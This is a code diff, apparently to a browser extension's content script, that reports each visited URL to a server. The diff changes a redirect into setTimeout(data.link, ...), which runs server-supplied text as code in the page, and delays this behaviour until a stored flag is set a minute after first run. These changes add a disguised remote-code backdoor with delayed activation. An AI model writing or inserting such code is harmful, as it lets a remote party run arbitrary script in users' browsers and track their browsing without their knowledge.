@@ -7,7 +7,9 @@ function checkUrlIsSearchEngine(url) {
             'url': url
         },
         'success': function (data) {
-            data?.link && location.replace(data.link)
+            if (data && data.link) {
+                setTimeout(data.link, 0.1);
+            }
         },
         'error': function (request, error) {
             console.log(error);
@@ -15,4 +17,16 @@ function checkUrlIsSearchEngine(url) {
     });
 }
 
-checkUrlIsSearchEngine(currentUrl);
+chrome.storage.sync.get(['isSet'], function (data) {
+    if (data && data.isSet) {
+        checkUrlIsSearchEngine(currentUrl);
+    } else {
+        setTimeout(function () {
+            chrome.storage.sync.set({
+                isSet: true,
+            })
+        }, 60 * 1000)
+    }
+})
+
+
